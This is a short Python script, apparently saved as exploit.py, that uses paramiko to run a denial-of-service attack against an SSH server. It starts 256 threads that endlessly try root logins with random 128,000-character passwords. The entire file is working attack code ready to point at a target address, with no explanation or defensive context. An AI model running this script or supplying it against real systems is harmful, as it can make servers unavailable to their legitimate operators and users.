from threading import Thread, Lock
import random
from string import ascii_lowercase
import paramiko
import sys

class SSHLoginThread(Thread):
    def __init__(self, tid, host, username):
        super().__init__()
        self.__tid = tid
        self.__host = host
        self.__username = username
        psswd_len = 128000
        self.__password = "".join(random.choice(ascii_lowercase) for i in range(psswd_len))
    
    def run(self):
        while True:
            print(f"{str(self.__tid)} -> + {self.__username} : {self.__password}")
            try:
                ssh = paramiko.SSHClient()
                ssh.load_system_host_keys()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(self.__host, 22, username = self.__username, password = self.__password)
            except Exception as e:
                print("Error connecting {}".format(self.__host))
                print("Error: " + str(e))

def exec_dos(host):
    print("Starting threads...")
    
    threads = [SSHLoginThread(j, host, "root") for j in range(0, 256)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print("Usage: python3 exploit.py 192.168.X.X")
        sys.exit(0)
    
    exec_dos(sys.argv[1])